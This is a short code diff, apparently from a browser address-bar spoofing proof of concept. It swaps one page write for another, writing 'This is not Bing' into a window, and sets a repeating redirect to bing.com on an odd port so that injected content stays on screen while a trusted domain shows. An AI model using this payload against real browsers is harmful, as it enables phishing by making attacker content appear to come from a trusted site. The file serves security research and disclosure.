@@ -11,9 +11,9 @@
         // Inject content before navigation commits
         setTimeout(() => {
           try {
-            window.stop();
-    win.document.write('This is not google');
-    win.document.close();
+            win.document.write("<h1>This is not Bing</h1>");
+    document.location = "https://bing.com:1234";
+    setInterval(function(){document.location="https://bing.com:1234";},9800);
           } catch (e) {
             console.log(e);
           }
